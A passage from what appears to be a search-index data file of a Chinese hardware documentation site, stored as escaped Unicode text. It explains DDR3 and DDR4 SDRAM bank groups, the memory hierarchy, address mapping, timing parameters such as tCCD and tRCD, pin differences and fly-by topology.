\u200b\u5185\u200b\u7684\u200b\u7684\u200b\u8fde\u7eed\u200b\u8bfb\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-3F DDR3\uff09 <p>\u200b\u4e3a\u4e86\u200b\u7f13\u89e3\u200b\u7b2c\u4e8c\u70b9\u200b\u5e26\u6765\u200b\u7684\u200b\u6027\u80fd\u200b\u635f\u5931\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b Bank \u200b\u7684\u200b\u6982\u5ff5\u200b\uff1a\u200b\u6bcf\u4e2a\u200b Bank \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u53d6\u51fa\u200b\u6765\u200b\u4e00\u4e2a\u200b row\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u8981\u200b\u8bbf\u95ee\u200b\u4e0d\u540c\u200b Bank \u200b\u91cc\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b\u7b2c\u4e00\u4e2a\u200b Bank \u200b\u8fdb\u884c\u200b Activate/Precharge \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5176\u4ed6\u200b Bank \u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4ece\u800c\u200b\u63a9\u76d6\u200b row \u200b\u672a\u200b\u547d\u4e2d\u200b\u5e26\u6765\u200b\u7684\u200b\u6027\u80fd\u200b\u635f\u5931\u200b\u3002</p>"},{"location":"hardware/sdram.html#bank-group","title":"Bank Group","text":"<p>DDR4 \u200b\u76f8\u6bd4\u200b DDR3 \u200b\u5f15\u5165\u200b\u4e86\u200b Bank Group \u200b\u7684\u200b\u6982\u5ff5\u200b\u3002\u200b\u5f15\u7528\u200b \u200b\u540c\u4e00\u200b bank group page hit \u200b\u7684\u200b\u65f6\u95f4\u200b\u662f\u200b tccd_S \u200b\u8fd8\u662f\u200b tccd_L? - Ricky Li \u200b\u7684\u200b\u56de\u7b54\u200b - \u200b\u77e5\u4e4e\u200b \u200b\u548c\u200b DDR4 \u200b\u4e3a\u4f55\u200b\u4f1a\u200b\u5f15\u5165\u200b tCCD_L \u200b\u548c\u200b tCCD_S \u200b\u7684\u200b\u89c2\u70b9\u200b\uff1aDDR4 \u200b\u7684\u200b Memory array \u200b\u9891\u7387\u200b\u76f8\u6bd4\u200b DDR3 \u200b\u63d0\u9ad8\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b <code>I/O Gating</code> \u200b\u4e0a\u200b\uff0c\u200b\u5373\u4f7f\u200b\u547d\u4e2d\u200b\u4e86\u200b Row\uff0c\u200b\u5373\u200b\u4f7f\u7528\u200b\u4e86\u200b\u591a\u4e2a\u200b\u5c5e\u4e8e\u200b\u540c\u4e00\u4e2a\u200b <code>I/O Gating</code> \u200b\u7684\u200b Bank\uff0c\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u5b9e\u73b0\u200b\u5b8c\u7f8e\u200b\u7684\u200b\u8fde\u7eed\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u5373\u200b\u4e24\u4e2a\u200b\u76f8\u90bb\u200b\u7684\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\u9694\u200b 5 \u200b\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u800c\u200b\u6bcf\u6b21\u200b\u8bfb\u200b\u4f20\u8f93\u200b 4 \u200b\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5229\u7528\u7387\u200b\u6700\u9ad8\u200b 80%\uff0c\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff1a</p> <p> </p> DDR4 \u200b\u7684\u200b\u975e\u200b\u8fde\u7eed\u200b\u8bfb\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-4D DDR4\uff09 <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u74f6\u9888\u200b\uff0cDDR4 \u200b\u5728\u200b\u6838\u5fc3\u200b\u90e8\u5206\u200b\u7684\u200b\u533a\u522b\u200b\u5c31\u662f\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b <code>Global I/O gating</code>\uff0c\u200b\u5e76\u4e14\u200b\u6bcf\u4e2a\u200b Bank Group \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b <code>I/O gating, DM mask logic</code>\uff0c\u200b\u4e0b\u9762\u200b\u5206\u522b\u200b\u753b\u51fa\u200b DDR3 \u200b\u548c\u200b DDR4 \u200b\u7684\u200b\u5b58\u50a8\u200b\u90e8\u5206\u200b\uff0c\u200b\u8fdb\u884c\u200b\u5bf9\u6bd4\u200b\uff1a</p> <p> </p> DDR3 SDRAM \u200b\u5b58\u50a8\u200b\u90e8\u5206\u200b\uff08\u200b\u56fe\u6e90\u200b Micron Datasheet\uff09 <p> </p> DDR4 SDRAM 512 Meg x 16 \u200b\u5b58\u50a8\u200b\u90e8\u5206\u200b\uff08\u200b\u56fe\u6e90\u200b Micron Datasheet\uff09 <p>\u200b\u6bcf\u4e2a\u200b Bank Group \u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b <code>I/O Gating</code> \u200b\u4ee5\u540e\u200b\uff0cDDR4 \u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u591a\u4e2a\u200b Bank Group \u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6d41\u6c34\u7ebf\u200b\u5f0f\u200b\u8f93\u51fa\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7b2c\u4e00\u4e2a\u200b Bank Group \u200b\u8bfb\u53d6\u200b\u4e86\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b I/O \u200b\u4e0a\u7528\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u4f20\u8f93\u200b\u5b8c\u200b\u6570\u636e\u200b\uff0c\u200b\u7acb\u9a6c\u200b\u7b2c\u4e8c\u4e2a\u200b Bank Group \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u5c31\u200b\u63a5\u4e0a\u200b\u4e86\u200b\uff0c\u200b\u53c8\u200b\u4f20\u8f93\u200b\u4e86\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\u56fe\u200b\uff1a</p> <p> </p> DDR4 \u200b\u4e0d\u540c\u200b Bank Group \u200b\u7684\u200b\u8fde\u7eed\u200b\u8bfb\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-4D DDR4\uff09 <p>\u200b\u4e0a\u56fe\u200b\u4e2d\u200b T0 \u200b\u65f6\u523b\u200b\u53d1\u8d77\u200b\u7b2c\u4e00\u4e2a\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0cT4 \u200b\u65f6\u523b\u200b\u53d1\u8d77\u200b\u7b2c\u4e8c\u4e2a\u200b\u8bf7\u6c42\u200b\uff0cT11-T15 \u200b\u5f97\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7d27\u63a5\u7740\u200b T15-T19 \u200b\u5f97\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u89e3\u51b3\u200b\u4e86\u200b\u9891\u7387\u200b\u63d0\u9ad8\u200b\u5e26\u6765\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"hardware/sdram.html#_6","title":"\u5b58\u50a8\u200b\u5c42\u6b21","text":"<p>\u200b\u4e0a\u9762\u200b\u5df2\u7ecf\u200b\u63d0\u5230\u200b\uff0c\u200b\u5728\u200b DDR SDRAM \u200b\u5185\u90e8\u200b\u7684\u200b\u5c42\u6b21\u200b\u4ece\u5927\u5230\u200b\u5c0f\u6709\u200b\uff1a</p> <ol> <li>Bank Group\uff1aDDR4 \u200b\u5f15\u5165\u200b\uff0c\u200b\u901a\u8fc7\u200b Bank Group \u200b\u63a9\u76d6\u200b DDR4 \u200b\u540c\u4e00\u4e2a\u200b Bank Group \u200b\u5185\u200b\u8fde\u7eed\u200b\u8bfb\u200b\u7684\u200b\u5ef6\u8fdf\u200b tCCD_L</li> <li>Bank\uff1a\u200b\u6bcf\u4e2a\u200b Bank \u200b\u540c\u65f6\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b Row \u200b\u88ab\u200b\u6fc0\u6d3b\u200b\uff0c\u200b\u901a\u8fc7\u200b\u591a\u4e2a\u200b Bank \u200b\u63a9\u76d6\u200b Activate/Precharge \u200b\u7684\u200b\u5ef6\u8fdf\u200b</li> <li>Row\uff1aActivate/Precharge \u200b\u7684\u200b\u5355\u4f4d\u200b</li> <li>Column\uff1a\u200b\u6bcf\u4e2a\u200b Column \u200b\u4fdd\u5b58\u200b n \u200b\u4e2a\u200b Cell\uff0cn \u200b\u662f\u200b SDRAM \u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b</li> <li>Cell\uff1a\u200b\u6bcf\u4e2a\u200b Cell \u200b\u4fdd\u5b58\u200b 1 bit \u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u5b9e\u9645\u4e0a\u200b\uff0cSDRAM \u200b\u5916\u90e8\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u5c42\u6b21\u200b\uff1a</p> <ol> <li>Channel\uff1a\u200b\u5904\u7406\u5668\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u901a\u9053\u200b\u6570\u91cf\u200b</li> <li>Module\uff1a\u200b\u5185\u5b58\u6761\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u5185\u5b58\u6761\u200b\u8fde\u63a5\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Channel \u200b\u4e0a\u200b</li> <li>Rank\uff1a\u200b\u591a\u4e2a\u200b DDR SDRAM \u200b\u82af\u7247\u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u8d77\u6765\u200b\uff0c\u200b\u4e00\u4e2a\u200b Module \u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u653e\u4e0b\u200b\u4e00\u5230\u200b\u56db\u4e2a\u200b Rank\uff0c\u200b\u8fd9\u4e9b\u200b Rank \u200b\u5171\u4eab\u200b\u603b\u7ebf\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Rank \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7247\u9009\u200b\u4fe1\u53f7\u200b CS_n\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u5728\u200b\u6df1\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b SDRAM \u200b\u82af\u7247\u200b</li> <li>Chip\uff1a\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b DDR SDRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b\u6570\u636e\u4f4d\u200b\u5bbd\u200b\u662f\u200b 64 \u200b\u4f4d\u200b\u7684\u200b Rank\uff0c\u200b\u662f\u200b\u4f7f\u7528\u200b 8 \u200b\u4e2a\u200b x8 \u200b\u7684\u200b Chip \u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u800c\u6210\u200b</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u76f8\u90bb\u200b\u5b58\u50a8\u200b\u5c42\u6b21\u200b\u4e4b\u95f4\u200b\u90fd\u200b\u5dee\u200b\u4e00\u4e2a\u200b\u4e8c\u200b\u7684\u200b\u5e42\u6b21\u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4ece\u200b\u5185\u5b58\u5730\u5740\u200b\u5230\u200b\u8fd9\u4e9b\u200b\u5b58\u50a8\u200b\u5c42\u6b21\u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u5c31\u662f\u200b\u622a\u53d6\u200b\u5730\u5740\u200b\u4e2d\u200b\u7684\u200b\u4e0d\u540c\u200b\u533a\u95f4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u533a\u95f4\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5c42\u6b21\u200b\u7684\u200b\u4e0b\u6807\u200b\u3002\u200b\u8fd9\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u5185\u5b58\u5927\u5c0f\u200b\u7684\u200b MB\u3001GB \u200b\u7528\u200b\u7684\u200b\u662f\u200b 1024 \u200b\u8fdb\u5236\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u7814\u7a76\u200b SDRAM \u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u6bd4\u5982\u200b Xilinx FPGA \u200b\u4e0a\u200b\u7684\u200b MIG\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u6620\u5c04\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>ROW_COLUMN_BANK</li> <li>ROW_BANK_COLUMN</li> <li>BANK_ROW_COLUMN</li> <li>ROW_COLUMN_LRANK_BANK</li> <li>ROW_LRANK_COLUMN_BANK</li> <li>ROW_COLUMN_BANK_INTLV</li> </ul> <p>\u200b\u5c31\u662f\u200b\u5c06\u200b\u5730\u5740\u200b\u7684\u200b\u4e0d\u540c\u200b\u90e8\u5206\u200b\u6620\u5c04\u200b\u5230\u200b DRAM \u200b\u7684\u200b\u51e0\u4e2a\u200b\u5730\u5740\u200b\uff1aRow\uff0cColumn\uff0cBank\u3002\u200b\u53ef\u4ee5\u200b\u60f3\u8c61\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u6620\u5c04\u200b\u65b9\u5f0f\u200b\u9488\u5bf9\u200b\u4e0d\u540c\u200b\u7684\u200b\u8bbf\u5b58\u200b\u6a21\u5f0f\u200b\u4f1a\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u8fde\u7eed\u200b\u7684\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\uff0cROW_COLUMN_BANK \u200b\u65b9\u5f0f\u200b\u662f\u200b\u6bd4\u8f83\u200b\u9002\u5408\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fde\u7eed\u200b\u7684\u200b\u8bbf\u95ee\u200b\u4f1a\u200b\u5206\u5e03\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b Bank \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u597d\u200b\u5730\u200b\u63a9\u76d6\u200b Activate/Precharge \u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u6027\u80fd\u200b\u5c31\u200b\u4f1a\u200b\u66f4\u597d\u200b\u3002</p>"},{"location":"hardware/sdram.html#_7","title":"\u65f6\u5e8f\u200b\u53c2\u6570","text":"<p>\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b DDR4 \u200b\u7684\u200b\u4e3b\u8981\u200b\u65f6\u5e8f\u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li>tCCD_S: \u200b\u5bf9\u200b\u4e0d\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b CAS \u200b\u65f6\u200b\uff0cCAS \u200b\u5230\u200b CAS \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08CAS to CAS delay short\uff09\uff0c\u200b\u5982\u200b 4 \u200b\u5468\u671f\u200b</li> <li>tCCD_L: \u200b\u5bf9\u200b\u76f8\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b CAS \u200b\u65f6\u200b\uff0cCAS \u200b\u5230\u200b CAS \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08CAS to CAS delay long\uff09\uff0c\u200b\u5982\u200b 6 \u200b\u5468\u671f\u200b</li> <li>tRRD_S: \u200b\u5bf9\u200b\u4e0d\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b ACTIVATE \u200b\u65f6\u200b\uff0cACT \u200b\u5230\u200b ACT \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08ACT to ACT delay short\uff09\uff0c\u200b\u5982\u200b 4 \u200b\u5468\u671f\u200b</li> <li>tRRD_L: \u200b\u5bf9\u200b\u76f8\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b ACTIVATE \u200b\u65f6\u200b\uff0cACT \u200b\u5230\u200b ACT \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08ACT to ACT delay long\uff09\uff0c\u200b\u5982\u200b 6 \u200b\u5468\u671f\u200b</li> <li>tWTR_S\uff1a\u200b\u5bf9\u200b\u4e0d\u540c\u200b Bank Group \u200b\u5148\u200b WRITE \u200b\u540e\u200b READ \u200b\u65f6\u200b\uff0cWRITE \u200b\u5b8c\u6210\u200b\u5199\u5165\u200b\uff08\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5b8c\u6210\u200b\uff09\u200b\u5230\u200b READ \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08Write to Read short\uff09</li> <li>tWTR_L\uff1a\u200b\u5bf9\u200b\u76f8\u540c\u200b Bank Group \u200b\u5148\u200b WRITE \u200b\u540e\u200b READ \u200b\u65f6\u200b\uff0cWRITE \u200b\u5b8c\u6210\u200b\u5199\u5165\u200b\uff08\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5b8c\u6210\u200b\uff09\u200b\u5230\u200b READ \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08Write to Read long\uff09</li> <li>tREFI\uff1a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u9700\u8981\u200b\u6309\u7167\u200b tREFI \u200b\u7684\u200b\u95f4\u9694\u200b\u53d1\u9001\u200b REFRESH \u200b\u547d\u4ee4\u200b\uff08Refresh Interval\uff09</li> <li>tRFC\uff1a\u200b\u4e24\u6b21\u200b REFRESH \u200b\u547d\u4ee4\u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Refresh Cycle\uff09</li> <li>tFAW: \u200b\u5728\u200b\u8fde\u7eed\u200b\u7684\u200b FAW \u200b\u65f6\u95f4\u200b\u5185\u200b\uff0c\u200b\u6700\u200b\u591a\u200b\u53d1\u9001\u200b\u56db\u4e2a\u200b ACTIVATE \u200b\u547d\u4ee4\u200b\uff08Four Activate Window\uff09\uff0c\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0c\u200b\u7b2c\u200b i \u200b\u6b21\u200b ACTIVATE \u200b\u548c\u200b\u7b2c\u200b i+4 \u200b\u6b21\u200b ACTIVATE \u200b\u81f3\u5c11\u200b\u95f4\u9694\u200b tFAW \u200b\u65f6\u95f4\u200b</li> <li>tRP\uff1aPRECHARGE \u200b\u547d\u4ee4\u200b\u53d1\u9001\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5230\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u547d\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08Precharge\uff09</li> <li>tRTP\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b READ \u200b\u5230\u200b PRE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Read to Precharge\uff09</li> <li>tRAS\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b ACT \u200b\u5230\u200b PRE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08RAS active time\uff0cActivate to Precharge\uff09</li> <li>tRCD\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b ACT \u200b\u5230\u200b READ/WRITE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Activate to Read/Write delay\uff09</li> <li>tRC\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b ACT \u200b\u5230\u200b ACT/PRE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Activate to Activate/Precharge delay\uff09</li> <li>CL\uff1aCAS Latency\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b Read Latency</li> <li>CWL\uff1aCAS Write Latency\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b Write Latency</li> <li>AL\uff1aAdditive Latency\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b Read Latency</li> <li>RL\uff1aRead Latency</li> <li>WL\uff1aWrite Latency</li> </ul> <p>Additive Latency \u200b\u770b\u4f3c\u200b\u4eba\u4e3a\u200b\u589e\u52a0\u200b\u4e86\u200b\u547d\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e5f\u200b\u4f1a\u200b\u63d0\u524d\u200b AL \u200b\u4e2a\u200b\u5468\u671f\u200b\u53bb\u200b\u53d1\u9001\u200b\u547d\u4ee4\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u8bbe\u7f6e\u200b AL \u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fde\u7eed\u200b\u53d1\u9001\u200b ACT \u200b\u548c\u200b READ \u200b\u547d\u4ee4\u200b\uff0c\u200b\u901a\u8fc7\u200b AL \u200b\u4f7f\u5f97\u200b READ \u200b\u547d\u4ee4\u200b\u5ef6\u8fdf\u200b\u751f\u6548\u200b\uff0c\u200b\u4ee5\u200b\u6ee1\u8db3\u200b tRCD \u200b\u65f6\u5e8f\u200b\u8981\u6c42\u200b\uff0c\u200b\u540c\u65f6\u200b\u547d\u4ee4\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7a7a\u95f2\u200b\u4e86\u200b\u51fa\u6765\u200b\u3002</p>"},{"location":"hardware/sdram.html#_8","title":"\u63a5\u53e3","text":"<p>\u200b\u4e0b\u9762\u200b\u753b\u51fa\u200b\u4e86\u200b DDR3 \u200b\u548c\u200b DDR4 \u200b\u7684\u200b\u5f15\u811a\u200b\uff1a</p> <p> </p> DDR3 \u200b\u548c\u200b DDR4 \u200b\u539f\u7406\u56fe\u200b <p>DDR3 \u200b\u548c\u200b DDR4 \u200b\u7684\u200b\u4e0d\u540c\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\uff1aDDR3 \u200b\u662f\u200b A0-A14\uff0cDDR4 \u200b\u662f\u200b A0-A17\uff0c\u200b\u5176\u4e2d\u200b A14-A16 \u200b\u590d\u7528\u200b\u4e86\u200b\u5f15\u811a\u200b</li> <li>DDR4 \u200b\u5f15\u5165\u200b\u4e86\u200b Bank Group\uff0c\u200b\u6240\u4ee5\u200b\u591a\u51fa\u200b\u4e86\u200b BG0-BG1 \u200b\u5f15\u811a\u200b\u4f5c\u4e3a\u200b Bank Group \u200b\u5730\u5740\u200b</li> <li>DDR4 \u200b\u5f15\u5165\u200b\u4e86\u200b Bank Group \u200b\u540e\u200b\uff0c\u200b\u603b\u200b Bank \u200b\u6570\u91cf\u200b\u662f\u200b \\(4*4=16\\)\uff1bDDR3 \u200b\u7684\u200b Bank \u200b\u6570\u91cf\u200b\u662f\u200b 8</li> <li>DDR3 \u200b\u4e2d\u200b\u7684\u200b RAS_n\u3001CAS_n \u200b\u548c\u200b WE_n \u200b\u5728\u200b DDR4 \u200b\u4e2d\u200b\u88ab\u200b\u590d\u7528\u200b\u4e3a\u4e86\u200b A14-A16\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u66f4\u200b\u5927\u200b\u7684\u200b\u5bb9\u91cf\u200b</li> <li>DDR4 \u200b\u989d\u5916\u200b\u6dfb\u52a0\u200b\u4e86\u200b ACT_n \u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b</li> </ol>"},{"location":"hardware/sdram.html#_9","title":"\u62d3\u6251","text":"<p>\u200b\u4e3a\u4e86\u200b\u83b7\u5f97\u200b\u66f4\u5927\u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\uff0c\u200b\u5728\u200b\u5185\u5b58\u6761\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5f88\u591a\u200b\u4e2a\u200b SDRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u901a\u8fc7\u200b\u5bbd\u5ea6\u200b\u62fc\u63a5\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5f62\u6210\u200b\u4e00\u4e2a\u200b 64 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u5bbd\u5ea6\u200b\u3002\u200b\u6b64\u65f6\u200b\u4ece\u200b PCB \u200b\u8d70\u7ebf\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u8bb2\u200b\uff0c\u200b\u6570\u636e\u7ebf\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u5230\u200b\u5404\u4e2a\u200b SDRAM \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f8\u5bf9\u200b\u5bb9\u6613\u200b\u5730\u200b\u8fde\u63a5\u200b\uff1b\u200b\u4f46\u662f\u200b\u5176\u4ed6\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u9700\u8981\u200b\u8fde\u63a5\u200b\u5230\u200b\u6240\u6709\u200b SDRAM \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u5728\u200b\u5c40\u9650\u200b\u7684\u200b\u7a7a\u95f4\u200b\u91cc\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u4fdd\u8bc1\u200b\u5230\u200b\u5404\u4e2a\u200b SDRAM \u200b\u82af\u7247\u200b\u7684\u200b\u8ddd\u79bb\u200b\u76f8\u7b49\u200b\uff0c\u200b\u540c\u65f6\u200b\u4fdd\u8bc1\u200b\u4fe1\u53f7\u200b\u5b8c\u6574\u6027\u200b\u662f\u200b\u5f88\u200b\u56f0\u96be\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/sdram.html#fly-by-topology","title":"Fly-by topology","text":"<p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5730\u5740\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\u662f\u200b\u91c7\u7528\u200b\u4e86\u200b\u4e32\u8054\u200b\u7684\u200b\u65b9\u5f0f\u200b\u8fde\u63a5\u200b\uff08Fly-by topology\uff09\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0b\u56fe\u200b\u7684\u200b\u53f3\u8fb9\u200b\u7684\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\uff1a</p> <p> </p> SDRAM \u200b\u7684\u200b\u4e24\u79cd\u200b\u4fe1\u53f7\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b Versal ACAP PCB Design User Guide (UG863)\uff09 <p>\u200b\u4f46\u662f\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff08DQ\u3001DQS \u200b\u548c\u200b DM\uff09\u200b\u4f9d\u7136\u200b\u662f\u200b\u5e76\u884c\u200b\u70b9\u5bf9\u70b9\u200b\u8fde\u63a5\u200b\u5230\u200b SDRAM \u200b\u4e0a\u200b\u7684\u200b\uff08\u200b\u4e0a\u200b\u56fe\u200b\u5de6\u4fa7\u200b\uff09\u3002\u200b\u8fd9\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u95ee\u9898\u200b\uff1a\u200b\u4e0d\u540c\u200b\u7684\u200b SDRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u6570\u636e\u200b\u548c\u200b\u65f6\u949f\u200b\u7684\u200b\u504f\u5dee\u200b\u4e0d\u540c\u200b\uff0c\u200b\u6570\u636e\u200b\u53ef\u80fd\u200b\u5dee\u4e0d\u591a\u200b\u65f6\u95f4\u200b\u5230\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u949f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u8d8a\u6765\u8d8a\u200b\u5927\u200b\uff1a</p> <p> </p> SDRAM \u200b\u7684\u200b\u65f6\u949f\u200b\u504f\u79fb\u200b\u95ee\u9898\u200b 